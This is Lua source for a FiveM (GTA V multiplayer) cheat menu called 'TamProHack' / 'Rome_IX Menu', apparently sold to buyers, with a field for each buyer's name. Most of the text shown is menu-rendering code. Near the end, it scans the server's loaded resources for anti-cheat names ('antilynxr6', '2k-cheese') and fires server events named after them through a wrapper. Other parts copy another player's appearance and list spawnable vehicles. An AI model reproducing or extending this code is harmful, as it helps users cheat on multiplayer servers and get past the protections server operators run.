local titolo = "<FONT COLOR='#1F2124'>Rome_IX ~r~Menu"
local pisellone = PlayerId(-1)
local pisello = GetPlayerName(pisellone)
local showblip = false
local PlayerOn = false
local showsprite = false
local nameabove = false
local esp = true
local TamProHackModZ = {}
local buyerserial = "Tonkla" -- Change the name to buyer's name
MMenu = {} 
TamProHackModZ.debug = false

-- Discord Settings --
local appID = '649055232268959754'
local appText = 'ซื้อได้จาก TamProHack เท่านั้น'
local appAsset = 'TamProHack1024x1024'
local appAssett = 'TamProHack1024x1024'
local appTextSmall = 'TamProHack'
local RichEnable = true
local RichName = GetPlayerName(PlayerId())
local RichContent = RichName .. 'Menu Lua'

-- Discord Settings --
-- COLOR SETTINGS --

local SubColor = {r = 34, g = 185, b = 202, a = 255}  --SUBTITLE AND TITLE COLOR
local Marker = {r = 34, g = 185, b = 202, a = 180}  --MARKER COLOR
local Background = {r = 148, g = 0, b = 211, a = 70} --BACKGROUND
local FocusText = {r = 255, g = 255, b = 255, a = 255} --FOCUS TEXT
local Version = "1.5" --SUBTITLE VERSION
local function RGB(frequency)
  local result = {}
  local curtime = GetGameTimer() / 2000
  result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
  result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
  result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

  return result
end

local menus = {}
local keys = {up = 172, down = 173, left = 174, right = 175, select = 215, back = 194}
local optionCount = 1
local currentKey = nil
local currentMenu = nil
local menuWidth = 0.18
local titleHeight = 0.05
local titleYOffset = 0.01
local titleScale = 0.5
local buttonHeight = 0.035
local buttonFont = 4
local buttonScale = 0.370
local buttonTextXOffset = 0.002
local buttonTextYOffset = 0.005
local descHeight = 0.035
local descFont = 1
local descXOffset = 0.003
local descScale = 0.370
local bytexd = "Rome IX Menu"
local MenuWider = nil

intro = 0


local function debugPrint(text)
  if TamProHackModZ.debug then
    Citizen.Trace("[TamProHackModZ] " .. tostring(text))
  end
end

local function setMenuProperty(id, property, value)
  if id and menus[id] then
    menus[id][property] = value
    debugPrint(id .. " menu property changed: { " .. tostring(property) .. ", " .. tostring(value) .. " }")
  end
end

local function isMenuVisible(id)
  if id and menus[id] then
    return menus[id].visible
  else
    return false
  end
end

local function setMenuVisible(id, visible, holdCurrent)
  if id and menus[id] then
    setMenuProperty(id, "visible", visible)

    if not holdCurrent and menus[id] then
      setMenuProperty(id, "currentOption", 1)
    end

    if visible then
      if id ~= currentMenu and isMenuVisible(currentMenu) then
        setMenuVisible(currentMenu, false)
      end

      currentMenu = id
    end
  end
end

local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
  SetTextColour(color.r, color.g, color.b, color.a)
  SetTextFont(font)
  SetTextScale(scale, scale)

  if shadow then
    SetTextDropShadow(2, 2, 0, 0, 0)
  end

  if menus[currentMenu] then
    if center then
      SetTextCentre(center)
    elseif alignRight then
      SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menuWidth - buttonTextXOffset)
      SetTextRightJustify(true)
    end
  end
  SetTextEntry("STRING")
  AddTextComponentString(text)
  DrawText(x, y)
end

local function drawRect(x, y, width, height, color)
  DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end

local function drawTitle()
  if menus[currentMenu] then
    local x = menus[currentMenu].x + menuWidth / 2
    local y = menus[currentMenu].y + titleHeight / 2

    if menus[currentMenu].titleBackgroundSprite then
      DrawSprite(
      menus[currentMenu].titleBackgroundSprite.dict,
      menus[currentMenu].titleBackgroundSprite.name,
      x,
      y,
      menuWidth,
      titleHeight,
      0.,
      255,
      255,
      255,
      255
      )
    else
      drawRect(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
    end

    drawText(
    menus[currentMenu].title,
    x,
    y - titleHeight / 2 + titleYOffset,
    menus[currentMenu].titleFont,
    menus[currentMenu].titleColor,
    titleScale,
    true
    )
  end
end

local function drawSubTitle()
  if menus[currentMenu] then
    local x = menus[currentMenu].x + menuWidth / 2
    local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

    local rgb = RGB(0.5)

    local subTitleColor = {
      r= 246,
      g= 179,
      b= 82,
      a = 255
    }

    drawRect(x, y, menuWidth, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
    drawText(
    menus[currentMenu].subTitle,
    menus[currentMenu].x + buttonTextXOffset,
    y - buttonHeight / 2 + buttonTextYOffset,
    buttonFont,
    subTitleColor,
    buttonScale,
    false
    )

    if optionCount > menus[currentMenu].maxOptionCount then
      drawText(
      tostring(menus[currentMenu].currentOption) .. " / " .. tostring(optionCount),
      menus[currentMenu].x + menuWidth,
      y - buttonHeight / 2 + buttonTextYOffset,
      buttonFont,
      subTitleColor,
      buttonScale,
      false,
      false,
      true
      )
    end
  end
end

local function drawDescription(desc, descYOffset, ky)
  if menus[currentMenu] then
    local x = menus[currentMenu].x + menuWidth / 2
    local y = menus[currentMenu].y + descHeight / 2
    local ra = RGB(5.0)
    local descriptionColor = {
      r = ra.r,
      g = ra.b,
      b = 255,
      a = 255
    }

    drawRect(x, y + ky, menuWidth, descHeight, descriptionBackgroundColor)

    drawText(
    desc,
    menus[currentMenu].x + descXOffset,
    y - descHeight / 2 + descYOffset + 0.005,
    descFont,
    descriptionColor,
    descScale,
    false
    )
  end
end

local function drawButton(text, subText)
  local x = menus[currentMenu].x + menuWidth / 2
  local multiplier = nil

  if
  menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and
  optionCount <= menus[currentMenu].maxOptionCount
  then
    multiplier = optionCount
  elseif
    optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
    optionCount <= menus[currentMenu].currentOption
    then
      multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
    end

    if multiplier then
      local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
      local backgroundColor = nil
      local textColor = nil
      local subTextColor = nil
      local shadow = false

      if menus[currentMenu].currentOption == optionCount then
        backgroundColor = menus[currentMenu].menuFocusBackgroundColor
        textColor = menus[currentMenu].menuFocusTextColor
        subTextColor = menus[currentMenu].menuFocusTextColor
      else
        backgroundColor = menus[currentMenu].menuBackgroundColor
        textColor = menus[currentMenu].menuTextColor
        subTextColor = menus[currentMenu].menuSubTextColor
        shadow = true
      end

      drawRect(x, y, menuWidth, buttonHeight, backgroundColor)
      drawText(
      text,
      menus[currentMenu].x + buttonTextXOffset,
      y - (buttonHeight / 2) + buttonTextYOffset,
      buttonFont,
      textColor,
      buttonScale,
      false,
      shadow
      )

      if subText then
        drawText(
        subText,
        menus[currentMenu].x + buttonTextXOffset,
        y - buttonHeight / 2 + buttonTextYOffset,
        buttonFont,
        subTextColor,
        buttonScale,
        false,
        shadow,
        true
        )
      end
    end
  end


  function TamProHackModZ.CreateMenu(id, title)
    -- Default settings
    menus[id] = {}
    menus[id].title = titolo
    menus[id].subTitle = "# Rome_IX Menu"


    menus[id].visible = false

    menus[id].previousMenu = nil

    menus[id].aboutToBeClosed = false

menus[id].x = 0.65
menus[id].y = 0.02

    menus[id].currentOption = 1
    menus[id].maxOptionCount = 20
    menus[id].titleFont = 6
    Citizen.CreateThread(
    function()
      while true do
        Citizen.Wait(0)
        local ra = RGB(2.0)
        menus[id].titleColor = {r = 255, g = 255, b = 255, a = 255}
      end
      end)
      Citizen.CreateThread(
      function()
        while true do
          Citizen.Wait(0)
          local ra = RGB(1.0)
          menus[id].menuFocusBackgroundColor = {r = 173, g = 216, b = 230, a = 120}
        end
        end)
        menus[id].titleBackgroundSprite = nil
        menus[id].titleBackgroundColor = {r = 246, g = 197, b = 82, a = 255}
        menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
        menus[id].menuSubTextColor = {r = 189, g = 189, b = 189, a = 255}
        menus[id].menuFocusTextColor = {r = 255, g = 255, b = 255, a = 255}
        menus[id].menuBackgroundColor = {r = 255, g = 255, b = 255, a = 30}

        menus[id].subTitleBackgroundColor = {r = 255, g = 255, b = 255, a = 30}

        descriptionBackgroundColor =
        {
          r = menus[id].menuBackgroundColor.r,
          g = menus[id].menuBackgroundColor.g,
          b = menus[id].menuBackgroundColor.b,
          a = 125
        }
        menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"}

        debugPrint(tostring(id) .. " menu created")
      end

      function TamProHackModZ.CreateSubMenu(id, parent, subTitle)
        if menus[parent] then
          TamProHackModZ.CreateMenu(id, menus[parent].title)

          if subTitle then
setMenuProperty(id, "subTitle", (subTitle))
          else
setMenuProperty(id, "subTitle", (menus[parent].subTitle))
          end

          setMenuProperty(id, "previousMenu", parent)

          setMenuProperty(id, "x", menus[parent].x)
          setMenuProperty(id, "y", menus[parent].y)
          setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
          setMenuProperty(id, "titleFont", menus[parent].titleFont)
          setMenuProperty(id, "titleColor", menus[parent].titleColor)
          setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
          setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
          setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
          setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
          setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
          setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
          setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
          setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
        else
          debugPrint("Failed to create " .. tostring(id) .. " submenu: " .. tostring(parent) .. " parent menu doesn't exist")
        end
      end

      function TamProHackModZ.CurrentMenu()
        return currentMenu
      end

      function TamProHackModZ.OpenMenu(id)
        if id and menus[id] then
          PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
          setMenuVisible(id, true)

          if menus[id].titleBackgroundSprite then
RequestStreamedTextureDict(menus[id].titleBackgroundSprite.dict, false)
while not HasStreamedTextureDictLoaded(menus[id].titleBackgroundSprite.dict) do
  Citizen.Wait(0)
end
          end

          debugPrint(tostring(id) .. " menu opened")
        else
          debugPrint("Failed to open " .. tostring(id) .. " menu: it doesn't exist")
        end
      end

      function TamProHackModZ.IsMenuOpened(id)
        return isMenuVisible(id)
      end

      function TamProHackModZ.IsAnyMenuOpened()
        for id, _ in pairs(menus) do
          if isMenuVisible(id) then
return true
          end
        end

        return false
      end

      function TamProHackModZ.IsMenuAboutToBeClosed()
        if menus[currentMenu] then
          return menus[currentMenu].aboutToBeClosed
        else
          return false
        end
      end

      function TamProHackModZ.CloseMenu()
        if menus[currentMenu] then
          if menus[currentMenu].aboutToBeClosed then
menus[currentMenu].aboutToBeClosed = false
setMenuVisible(currentMenu, false)
debugPrint(tostring(currentMenu) .. " menu closed")
PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
optionCount = 0
currentMenu = nil
currentKey = nil
          else
menus[currentMenu].aboutToBeClosed = true
debugPrint(tostring(currentMenu) .. " menu about to be closed")
          end
        end
      end

      function TamProHackModZ.Button(text, subText)
        local buttonText = text
        if subText then
          buttonText = "{ " .. tostring(buttonText) .. ", " .. tostring(subText) .. " }"
        end

        if menus[currentMenu] then
          optionCount = optionCount + 1

          local isCurrent = menus[currentMenu].currentOption == optionCount

          drawButton(text, subText)

          if isCurrent then
if currentKey == keys.select then
  PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
  debugPrint(buttonText .. " button pressed")
  return true
elseif currentKey == keys.left or currentKey == keys.right then
  PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
end
          end

          return false
        else
          debugPrint("Failed to create " .. buttonText .. " button: " .. tostring(currentMenu) .. " menu doesn't exist")

          return false
        end
      end

      function TamProHackModZ.MenuButton(text, id)
        if menus[id] then
          if TamProHackModZ.Button(text) then
setMenuVisible(currentMenu, false)
setMenuVisible(id, true, true)

return true
          end
        else
          debugPrint("Failed to create " .. tostring(text) .. " menu button: " .. tostring(id) .. " submenu doesn't exist")
        end

        return false
      end

      function TamProHackModZ.CheckBox(text, bool, callback)
        local checked = "~r~OFF"
        if bool then
          checked = "~g~ON"
        end

        if TamProHackModZ.Button(text, checked) then
          bool = not bool
          debugPrint(tostring(text) .. " checkbox changed to " .. tostring(bool))
          callback(bool)

          return true
        end

        return false
      end

      local function revO()
        MenuWider = 0
      end

      function TamProHackModZ.ComboBox(text, items, currentIndex, selectedIndex, callback)
        local itemsCount = #items
        local selectedItem = items[currentIndex]
        local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

        if itemsCount > 1 and isCurrent then
          selectedItem = '- '..tostring(selectedItem)..' +'
        end

        if TamProHackModZ.Button(text, selectedItem) then
          selectedIndex = currentIndex
          callback(currentIndex, selectedIndex)
          return true
        elseif isCurrent then
          if currentKey == keys.left then
if currentIndex > 1 then
  currentIndex = currentIndex - 1
else
  currentIndex = itemsCount
end
          elseif currentKey == keys.right then
if currentIndex < itemsCount then
  currentIndex = currentIndex + 1
else
  currentIndex = 1
end
          end
        else
          currentIndex = selectedIndex
        end

        callback(currentIndex, selectedIndex)
        return false
      end

      function TSE(a,b,c,d,e,f,g,h,i,m)
        TriggerServerEvent(a,b,c,d,e,f,g,h,i,m)
      end

      function TamProHackModZ.Display()
        if isMenuVisible(currentMenu) then
          if menus[currentMenu].aboutToBeClosed then
TamProHackModZ.CloseMenu()
          else
ClearAllHelpMessages()

drawTitle()
drawSubTitle()

currentKey = nil

if IsDisabledControlJustPressed(0, keys.down) then
  PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

  if menus[currentMenu].currentOption < optionCount then
    menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
  else
    menus[currentMenu].currentOption = 1
  end
elseif IsDisabledControlJustPressed(0, keys.up) then
  PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

  if menus[currentMenu].currentOption > 1 then
    menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
  else
    menus[currentMenu].currentOption = optionCount
  end
elseif IsDisabledControlJustPressed(0, keys.left) then
  currentKey = keys.left
elseif IsDisabledControlJustPressed(0, keys.right) then
  currentKey = keys.right
elseif IsDisabledControlJustPressed(0, keys.select) then
  currentKey = keys.select
elseif IsDisabledControlJustPressed(0, keys.back) then
  if menus[menus[currentMenu].previousMenu] then
    PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
    setMenuVisible(menus[currentMenu].previousMenu, true)
  else
    TamProHackModZ.CloseMenu()
  end
end

optionCount = 0
          end
        end
      end

      function TamProHackModZ.SetMenuWidth(id, width)
        setMenuProperty(id, "width", width)
      end

      function TamProHackModZ.SetMenuX(id, x)
        setMenuProperty(id, "x", x)
      end

      function TamProHackModZ.SetMenuY(id, y)
        setMenuProperty(id, "y", y)
      end

      function TamProHackModZ.SetMenuMaxOptionCountOnScreen(id, count)
        setMenuProperty(id, "maxOptionCount", count)
      end

      function TamProHackModZ.SetTitleColor(id, r, g, b, a)
        setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
      end

      function TamProHackModZ.SetTitleBackgroundColor(id, r, g, b, a)
        setMenuProperty(
        id,
        "titleBackgroundColor",
        {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a}
        )
      end

      function TamProHackModZ.SetTitleBackgroundSprite(id, textureDict, textureName)
        setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
      end

      function TamProHackModZ.SetSubTitle(id, text)
        setMenuProperty(id, "subTitle", (text))
      end


      function TamProHackModZ.SetMenuBackgroundColor(id, r, g, b, a)
        setMenuProperty(
        id,
        "menuBackgroundColor",
        {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a}
        )
      end

      function TamProHackModZ.SetMenuTextColor(id, r, g, b, a)
        setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
      end

      function TamProHackModZ.SetMenuSubTextColor(id, r, g, b, a)
        setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
      end

      function TamProHackModZ.SetMenuFocusColor(id, r, g, b, a)
        setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
      end

      function TamProHackModZ.SetMenuButtonPressedSound(id, name, set)
        setMenuProperty(id, "buttonPressedSound", {["name"] = name, ["set"] = set})
      end

      function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
    AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
        while (UpdateOnscreenKeyboard() == 0) do
          DisableAllControlActions(0)
          if IsDisabledControlPressed(0, 322) then return "" end
          Wait(0)
        end
        if (GetOnscreenKeyboardResult()) then
          local result = GetOnscreenKeyboardResult()
          return result
        end
      end

      function EnumeratePickups()
        return EnumerateEntities(FindFirstPickup, FindNextPickup, EndFindPickup)
      end

      function AddVectors(vect1, vect2)
        return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
      end

      function SubVectors(vect1, vect2)
        return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
      end

      function ScaleVector(vect, mult)
        return vector3(vect.x*mult, vect.y*mult, vect.z*mult)
      end

      function GetSeatPedIsIn(ped)
        if not IsPedInAnyVehicle(ped, false) then return
      else
        veh = GetVehiclePedIsIn(ped)
        for i=0, GetVehicleMaxNumberOfPassengers(veh) do
          if GetPedInVehicleSeat(veh) then return i end
        end
      end
    end

    function GetCamDirFromScreenCenter()
      local pos = GetGameplayCamCoord()
      local world = ScreenToWorld(0, 0)
      local ret = SubVectors(world, pos)
      return ret
    end

    function ScreenToWorld(screenCoord)
      local camRot = GetGameplayCamRot(2)
      local camPos = GetGameplayCamCoord()

      local vect2x = 0.0
      local vect2y = 0.0
      local vect21y = 0.0
      local vect21x = 0.0
      local direction = RotationToDirection(camRot)
      local vect3 = vector3(camRot.x + 10.0, camRot.y + 0.0, camRot.z + 0.0)
      local vect31 = vector3(camRot.x - 10.0, camRot.y + 0.0, camRot.z + 0.0)
      local vect32 = vector3(camRot.x, camRot.y + 0.0, camRot.z + -10.0)

      local direction1 = RotationToDirection(vector3(camRot.x, camRot.y + 0.0, camRot.z + 10.0)) - RotationToDirection(vect32)
      local direction2 = RotationToDirection(vect3) - RotationToDirection(vect31)
      local radians = -(math.rad(camRot.y))

      vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians))
      vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians))

      local case1, x1, y1 = WorldToScreenRel(((camPos + (direction * 10.0)) + vect33) + vect34)
      if not case1 then
        vect2x = x1
        vect2y = y1
        return camPos + (direction * 10.0)
      end

      local case2, x2, y2 = WorldToScreenRel(camPos + (direction * 10.0))
      if not case2 then
        vect21x = x2
        vect21y = y2
        return camPos + (direction * 10.0)
      end

      if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then
        return camPos + (direction * 10.0)
      end

      local x = (screenCoord.x - vect21x) / (vect2x - vect21x)
      local y = (screenCoord.y - vect21y) / (vect2y - vect21y)
      return ((camPos + (direction * 10.0)) + (vect33 * x)) + (vect34 * y)

    end

    function WorldToScreenRel(worldCoords)
      local check, x, y = GetScreenCoordFromWorldCoord(worldCoords.x, worldCoords.y, worldCoords.z)
      if not check then
        return false
      end

      screenCoordsx = (x - 0.5) * 2.0
      screenCoordsy = (y - 0.5) * 2.0
      return true, screenCoordsx, screenCoordsy
    end

    function RotationToDirection(rotation)
      local retz = math.rad(rotation.z)
      local retx = math.rad(rotation.x)
      local absx = math.abs(math.cos(retx))
      return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
    end

    local function GetCamDirection()
      local heading = GetGameplayCamRelativeHeading()+GetEntityHeading(GetPlayerPed(-1))
      local pitch = GetGameplayCamRelativePitch()

      local x = -math.sin(heading*math.pi/180.0)
      local y = math.cos(heading*math.pi/180.0)
      local z = math.sin(pitch*math.pi/180.0)

      local len = math.sqrt(x*x+y*y+z*z)
      if len ~= 0 then
        x = x/len
        y = y/len
        z = z/len
      end

      return x,y,z
    end

    local function getPlayerIds()
      local players = {}
      for i = 0, GetNumberOfPlayers() do
        if NetworkIsPlayerActive(i) then
          players[#players + 1] = i
        end
      end
      return players
    end

  local function RandomSkin(target)
    local ped = GetPlayerPed(target)
    SetPedRandomComponentVariation(ped, false)
    SetPedRandomProps(ped)
  end

  local function GetResources()
    local resources = {}
    for i=0, GetNumResources() do
      resources[i] = GetResourceByFindIndex(i)
    end
    return resources
  end

  

  local function ClonePedlol(target)
    local ped = GetPlayerPed(target)
    local me = PlayerPedId()
    
    hat = GetPedPropIndex(ped, 0)
    hat_texture = GetPedPropTextureIndex(ped, 0)
    
    glasses = GetPedPropIndex(ped, 1)
    glasses_texture = GetPedPropTextureIndex(ped, 1)
    
    ear = GetPedPropIndex(ped, 2)
    ear_texture = GetPedPropTextureIndex(ped, 2)
    
    watch = GetPedPropIndex(ped, 6)
    watch_texture = GetPedPropTextureIndex(ped, 6)
    
    wrist = GetPedPropIndex(ped, 7)
    wrist_texture = GetPedPropTextureIndex(ped, 7)
    
    head_drawable = GetPedDrawableVariation(ped, 0)
    head_palette = GetPedPaletteVariation(ped, 0)
    head_texture = GetPedTextureVariation(ped, 0)
    
    beard_drawable = GetPedDrawableVariation(ped, 1)
    beard_palette = GetPedPaletteVariation(ped, 1)
    beard_texture = GetPedTextureVariation(ped, 1)
    
    hair_drawable = GetPedDrawableVariation(ped, 2)
    hair_palette = GetPedPaletteVariation(ped, 2)
    hair_texture = GetPedTextureVariation(ped, 2)
    
    torso_drawable = GetPedDrawableVariation(ped, 3)
    torso_palette = GetPedPaletteVariation(ped, 3)
    torso_texture = GetPedTextureVariation(ped, 3)
    
    legs_drawable = GetPedDrawableVariation(ped, 4)
    legs_palette = GetPedPaletteVariation(ped, 4)
    legs_texture = GetPedTextureVariation(ped, 4)
    
    hands_drawable = GetPedDrawableVariation(ped, 5)
    hands_palette = GetPedPaletteVariation(ped, 5)
    hands_texture = GetPedTextureVariation(ped, 5)
    
    foot_drawable = GetPedDrawableVariation(ped, 6)
    foot_palette = GetPedPaletteVariation(ped, 6)
    foot_texture = GetPedTextureVariation(ped, 6)
    
    acc1_drawable = GetPedDrawableVariation(ped, 7)
    acc1_palette = GetPedPaletteVariation(ped, 7)
    acc1_texture = GetPedTextureVariation(ped, 7)
    
    acc2_drawable = GetPedDrawableVariation(ped, 8)
    acc2_palette = GetPedPaletteVariation(ped, 8)
    acc2_texture = GetPedTextureVariation(ped, 8)
    
    acc3_drawable = GetPedDrawableVariation(ped, 9)
    acc3_palette = GetPedPaletteVariation(ped, 9)
    acc3_texture = GetPedTextureVariation(ped, 9)
    
    mask_drawable = GetPedDrawableVariation(ped, 10)
    mask_palette = GetPedPaletteVariation(ped, 10)
    mask_texture = GetPedTextureVariation(ped, 10)
    
    aux_drawable = GetPedDrawableVariation(ped, 11)
    aux_palette = GetPedPaletteVariation(ped, 11)   
    aux_texture = GetPedTextureVariation(ped, 11)

    SetPedPropIndex(me, 0, hat, hat_texture, 1)
    SetPedPropIndex(me, 1, glasses, glasses_texture, 1)
    SetPedPropIndex(me, 2, ear, ear_texture, 1)
    SetPedPropIndex(me, 6, watch, watch_texture, 1)
    SetPedPropIndex(me, 7, wrist, wrist_texture, 1)
    
    SetPedComponentVariation(me, 0, head_drawable, head_texture, head_palette)
    SetPedComponentVariation(me, 1, beard_drawable, beard_texture, beard_palette)
    SetPedComponentVariation(me, 2, hair_drawable, hair_texture, hair_palette)
    SetPedComponentVariation(me, 3, torso_drawable, torso_texture, torso_palette)
    SetPedComponentVariation(me, 4, legs_drawable, legs_texture, legs_palette)
    SetPedComponentVariation(me, 5, hands_drawable, hands_texture, hands_palette)
    SetPedComponentVariation(me, 6, foot_drawable, foot_texture, foot_palette)
    SetPedComponentVariation(me, 7, acc1_drawable, acc1_texture, acc1_palette)
    SetPedComponentVariation(me, 8, acc2_drawable, acc2_texture, acc2_palette)
    SetPedComponentVariation(me, 9, acc3_drawable, acc3_texture, acc3_palette)
    SetPedComponentVariation(me, 10, mask_drawable, mask_texture, mask_palette)
    SetPedComponentVariation(me, 11, aux_drawable, aux_texture, aux_palette)
  end


    function DrawText3D(x, y, z, text, r, g, b)
      SetDrawOrigin(x, y, z, 0)
      SetTextFont(0)
      SetTextProportional(0)
      SetTextScale(0.0, 0.20)
      SetTextColour(r, g, b, 255)
      SetTextDropshadow(0, 0, 0, 0, 255)
      SetTextEdge(2, 0, 0, 0, 150)
      SetTextDropShadow()
      SetTextOutline()
      SetTextEntry("STRING")
      SetTextCentre(1)
      AddTextComponentString(text)
      DrawText(0.0, 0.0)
      ClearDrawOrigin()
    end

    function math.round(num, numDecimalPlaces)
      return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
    end

    local function RGB(frequency)
      local result = {}
      local curtime = GetGameTimer() / 1000

      result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
      result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
      result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

      return result
    end

    function notify(text)
      SetNotificationTextEntry("STRING")
      AddTextComponentString(text)
      DrawNotification(true, false)
    end

    function checkValidVehicleExtras()
      local playerPed = PlayerPedId()
      local playerVeh = GetVehiclePedIsIn(playerPed, false)
      local valid = {}

      for i=0,50,1 do
        if(DoesExtraExist(playerVeh, i))then
          local realModname = "Extra #"..tostring(i)
          local text = "OFF"
          if(IsVehicleExtraTurnedOn(playerVeh, i))then
text = "ON"
          end
          local realSpawnname = "extra "..tostring(i)
          table.insert(valid, {
menuName=realModName,
data ={
  ["action"] = realSpawnName,
  ["state"] = text
}
          })
        end
      end

      return valid
    end


    function DoesVehicleHaveExtras( veh )
      for i = 1, 30 do
        if ( DoesExtraExist( veh, i ) ) then
          return true
        end
      end

      return false
    end


    function checkValidVehicleMods(modID)
      local playerPed = PlayerPedId()
      local playerVeh = GetVehiclePedIsIn(playerPed, false)
      local valid = {}
      local modCount = GetNumVehicleMods(playerVeh,modID)
      if (modID == 48 and modCount == 0) then


        local modCount = GetVehicleLiveryCount(playerVeh)
        for i=1, modCount, 1 do
          local realIndex = i - 1
          local modName = GetLiveryName(playerVeh, realIndex)
          local realModName = GetLabelText(modName)
          local modid, realSpawnName = modID, realIndex

          valid[i] = {
menuName=realModName,
data = {
  ["modid"] = modid,
  ["realIndex"] = realSpawnName
}
          }
        end
      end

      for i = 1, modCount, 1 do
        local realIndex = i - 1
        local modName = GetModTextLabel(playerVeh, modID, realIndex)
        local realModName = GetLabelText(modName)
        local modid, realSpawnName = modCount, realIndex


        valid[i] = {
          menuName=realModName,
          data = {
["modid"] = modid,
["realIndex"] = realSpawnName
          }
        }
      end


      if(modCount > 0)then
        local realIndex = -1
        local modid, realSpawnName = modID, realIndex
        table.insert(valid, 1, {
          menuName="Stock",
          data = {
["modid"] = modid,
["realIndex"] = realSpawnName
          }
        })
      end

      return valid
    end
    local protection = false
    Resources = GetResources()
    for i=0, #Resources do
      local detect = string.find(tostring(Resources[i]), "antilynxr6")
      local antishit = string.find(tostring(Resources[i]), "antilynxr5")
      local detect = string.find(tostring(Resources[i]), "2k-cheese")
      local antishit = string.find(tostring(Resources[i]), "2k-cheese")
      print(Resources[i])
      if antishit ~= nil then
        TamProHackModZ.OpenMenu(HighTachMenu)
      end
      if detect ~= nil then
      TSE("antilynxr6:detection")
      TSE("2k-cheese:detection")
      end
    end

    local boats = {"Dinghy", "Dinghy2", "Dinghy3", "Dingh4", "Jetmax", "Marquis", "Seashark", "Seashark2", "Seashark3", "Speeder", "Speeder2", "Squalo", "Submersible", "Submersible2", "Suntrap", "Toro", "Toro2", "Tropic", "Tropic2", "Tug"}
    local Commercial = {"Benson", "Biff", "Cerberus", "Cerberus2", "Cerberus3", "Hauler", "Hauler2", "Mule", "Mule2", "Mule3", "Mule4", "Packer", "Phantom", "Phantom2", "Phantom3", "Pounder", "Pounder2", "Stockade", "Stockade3", "Terbyte"}
    local Compacts = {"Blista", "Blista2", "Blista3", "Brioso", "Dilettante", "Dilettante2", "Issi2", "Issi3", "issi4", "Iss5", "issi6", "Panto", "Prarire", "Rhapsody"}
    local Coupes = { "CogCabrio", "Exemplar", "F620", "Felon", "Felon2", "Jackal", "Oracle", "Oracle2", "Sentinel", "Sentinel2", "Windsor", "Windsor2", "Zion", "Zion2"}
    local cycles = { "Bmx", "Cruiser", "Fixter", "Scorcher", "Tribike", "Tribike2", "tribike3" }
    local Emergency = { "Ambulance", "FBI", "FBI2", "FireTruk", "PBus", "Police", "Police2", "Police3", "Police4", "PoliceOld1", "PoliceOld2", "PoliceT", "Policeb", "Polmav", "Pranger", "Predator", "Riot", "Riot2", "Sheriff", "Sheriff2"}
